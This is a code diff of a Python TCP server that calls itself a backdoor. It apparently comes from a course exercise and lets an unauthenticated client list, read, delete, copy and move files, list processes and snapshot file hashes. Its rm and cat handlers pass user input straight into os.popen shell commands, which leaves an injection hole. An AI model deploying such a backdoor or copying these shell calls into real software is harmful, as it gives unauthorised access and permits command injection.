@@ -8,6 +8,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096
    def handle(self):
 
+       #dictionary for help command
        descriptions = {}
        descriptions["pwd"] = 'pwd - return the current working directory'
        descriptions["cd"] = 'cd <dir> - change the current working directory to <dir>'
@@ -58,17 +59,10 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 
                # pwd
                if data.strip() == "pwd":
-                   self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8")) 
+                   self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8"))  
                    continue
                
-               # cd <dir>
-               if data.split(None, 1)[0] == "cd":
-                   try:
-                      self.request.sendall(bytearray("going to " + data.split(None,2)[1] + "\n", "utf-8"))
-                      os.chdir(data.split(None, 2)[1])
-                   except:
-                       self.request.sendall(bytearray("bad request\n", "utf-8"))
-                   continue
+             
                
                # ls
                if data.strip() == "ls":
@@ -78,8 +72,69 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                   self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                   continue
                
-               # cp <file1> <file2>
-               if data.split(None, 1)[0] == "cp":
+               #commands with one argument
+               if len(data.split()) == 2:
+                 
+                 # cd <dir>
+                 if data.split(None, 1)[0] == "cd":
+                   try:
+                      self.request.sendall(bytearray("going to " + data.split(None,2)[1] + "\n", "utf-8"))
+                      os.chdir(data.split(None, 2)[1])
+                   except:
+                       self.request.sendall(bytearray("bad request\n", "utf-8"))
+                   continue
+
+                  #rm <file>
+                 if data.split(None, 1)[0] == "rm":
+                    filename = data.split(None, 2)[1]
+                    try:
+                      #check if argument exists and is a file
+                     if os.path.isfile(filename):                           
+                        command = os.popen("rm " + filename)                   #execute rm command
+                        self.request.sendall(bytearray("OK\n", "utf-8"))
+                     else:
+                        self.request.sendall(bytearray(filename + " does not exist or is a directory\n", "utf-8"))
+                    except:
+                      self.request.sendall(bytearray("bad request\n", "utf-8"))
+                    continue
+                    
+
+                  #cat <file>
+                 if data.split(None, 1)[0] == "cat":
+                    catfile = data.split(None, 2)[1]                      #get the name of the cat file
+                    try:
+                      #check if argument exists and is a file
+                     if os.path.isfile(catfile):
+                        command = os.popen("cat " + catfile)                  #execute cat command from operating system
+                        contents = command.read()                             #read the output
+                        self.request.sendall(bytearray(contents,  "utf-8"))   #write output to the server
+                    except:
+                      self.request.sendall(bytearray("bad request\n", "utf-8"))
+                    continue 
+
+
+
+
+                  
+
+               
+                #commands with two mandatory arguments 
+               if len(data.split()) == 3:
+
+                  # mv <file1> <file2>
+                  if data.split(None, 1)[0] == "mv":
+
+                   file1 = data.split(None, 2)[1]
+                   file2 = data.split(None, 3)[2]
+                   try:
+                      os.rename(file1, file2)                                     #rename file1 to file2
+                      self.request.sendall(bytearray("OK\n", "utf-8")) 
+                   except:
+                       self.request.sendall(bytearray("bad request\n", "utf-8"))
+                   continue
+                  
+                  # cp <file1> <file2>
+                  elif data.split(None, 1)[0] == "cp":
                    file1 = data.split(None, 2)[1]
                    file2 = data.split(None, 3)[2]
                    try:
@@ -88,37 +143,9 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                    except:
                        self.request.sendall(bytearray("bad request\n", "utf-8"))
                    continue
-               
-               # mv <file1> <file2>
-               if data.split(None, 1)[0] == "mv":
-                   file1 = data.split(None, 2)[1]
-                   file2 = data.split(None, 3)[2]
-                   try:
-                      os.rename(file1, file2)
-                      self.request.sendall(bytearray("OK\n", "utf-8")) 
-                   except:
-                       self.request.sendall(bytearray("bad request\n", "utf-8"))
-                   continue
-                
-                # rm <file>
-               if data.split(None, 1)[0] == "rm":
-                 filename = data.split(None, 2)[1]
-                 try:
-                   command = os.popen("rm " + filename)
-                   self.request.sendall(bytearray("OK\n", "utf-8")) 
-                 except:
-                   self.request.sendall(bytearray("bad request\n", "utf-8"))
-                 continue
-
-                # cat <file>
-               if data.split(None, 1)[0] == "cat":
-                  catfile = data.split(None, 2)[1]              #get the name of the cat file
-                  command = os.popen("cat " + catfile)          #execute cat command from operating system
-                  contents = command.read()                     #read the output
-                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
-                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                   continue
-                
+
+
                 #snap
                if data.strip() == "snap":
                   command = os.popen('ls -d "$PWD"/*')
@@ -126,13 +153,14 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                   contents = contents.splitlines()
 
                   # create hash to be stored
+                  global hasher
                   for path in contents:
                        if os.path.isfile(path):
                            with open(path, 'rb') as afile:
                                buff = afile.read()
                                hasher = hashlib.md5(buff)
-                       file_hash[path] = hasher.hexdigest()
-                       print(path + " :: " + file_hash[path])
+                       snap_hash[path] = hasher.hexdigest()                 #store hash
+                       print(path + " :: " + snap_hash[path])
 
                   
                   self.request.sendall(bytearray("OK\n", "utf-8"))
@@ -143,40 +171,40 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                if data.strip() == "diff":
                    
                    # first check if a snapshot has been made yet
-                   if not file_hash:
+                   if not snap_hash:
                        self.request.sendall(bytearray("ERROR: no snapshot\n", "utf-8"))
                        continue
 
-                   contents = os.popen('ls -d "$PWD"/*')
-                   contents = contents.read()
-                   contents = contents.splitlines()
+                   contents = os.popen('ls -d "$PWD"/*')                            #list the full file path of each file 
+                   contents = contents.read()                                 
+                   contents = contents.splitlines()                                 #split the contents by each line
                    
-                   file_hash2 = {}
+                   diff_hash = {}                                                  #new dictionary to be used for diff
                    
-                   # create hash to be compared with snap's
+                   # create hash to be compared with snap's hash
                    for path in contents:
                        if os.path.isfile(path):
                            with open(path, 'rb') as afile:
                                buff = afile.read()
                                hasher = hashlib.md5(buff)
-                       file_hash2[path] = hasher.hexdigest()
-                       print(path + " :: " + file_hash2[path])
+                       diff_hash[path] = hasher.hexdigest()
+                       print(path + " :: " + diff_hash[path])
 
-                   # check differences
-                   for path in file_hash.keys():
+                   # check differences and print file names of the affected files
+                   for path in snap_hash.keys():
 
                        # if in old but not new, deleted
-                       if ((path in file_hash.keys()) and (path not in file_hash2.keys())):
+                       if ((path in snap_hash.keys()) and (path not in diff_hash.keys())):
                            self.request.sendall(bytearray(path.split("/")[len(path.split("/")) - 1] + " - was deleted\n", "utf-8"))
                          
                       # if present in both, check hash, if hashes differ, it was changed
-                       if ((path in file_hash2.keys()) and (path in file_hash.keys())):  
-                          if file_hash.get(path) != file_hash2.get(path):
+                       if ((path in diff_hash.keys()) and (path in snap_hash.keys())):  
+                          if snap_hash.get(path) != diff_hash.get(path):
                                self.request.sendall(bytearray(path.split("/")[len(path.split("/")) - 1] + " - was changed\n", "utf-8"))
                          
                    # check paths in new; if in new and not old, added     
-                   for path in file_hash2.keys():
-                       if ((path in file_hash2.keys()) and (path not in file_hash.keys())):
+                   for path in diff_hash.keys():
+                       if ((path in diff_hash.keys()) and (path not in snap_hash.keys())):
                            self.request.sendall(bytearray(path.split("/")[len(path.split("/")) - 1] + " - was added\n", "utf-8"))
                    continue
 
@@ -201,23 +229,23 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 
                 # ps                
                if data.strip() == "ps":
-                  command = os.popen("ps")                      #execute ps command from operating system
-                  contents = command.read()                     #read the output
-                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
-                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
+                  command = os.popen("ps")                              #execute ps command from operating system
+                  contents = command.read()                             #read the output
+                  self.request.sendall(bytearray(contents,  "utf-8"))   #write output to the server
+                  self.request.sendall(bytearray("\n",  "utf-8"))       #write output to the server
                   continue
 
                 # who
                if data.strip() == "who":
-                  command = os.popen("who")          #execute cat command from operating system
-                  contents = command.read()                     #read the output
-                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
+                  command = os.popen("who")                                   #execute who command from operating system
+                  contents = command.read()                                   #read the output
+                  self.request.sendall(bytearray(contents,  "utf-8"))         #write output to the server
                   continue
 
                # logout
                if data.strip() == "logout":
                    self.request.sendall(bytearray("bye bye\n", "utf-8"))
-                   break 
+                   break                                                      #disconnet client
 
                 # off
                if data.strip() == "off":
@@ -227,14 +255,14 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                 
                # end of all commands, everything else don't understand
                else:
-                   self.request.sendall(bytearray("Sorry don't understand your request\n", "utf-8"))
+                   self.request.sendall(bytearray("Sorry, I don't understand your request\n", "utf-8"))
            
 
 if __name__ == "__main__":
    HOST, PORT = "localhost", int(sys.argv[1])
    server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
    print("backdoor listening on port ", PORT)
-   file_hash = {}   # hash for snap to stay alive even through logout
+   snap_hash = {}                                                                     # hash for snap to stay alive even through logout
    server.serve_forever()
   
    
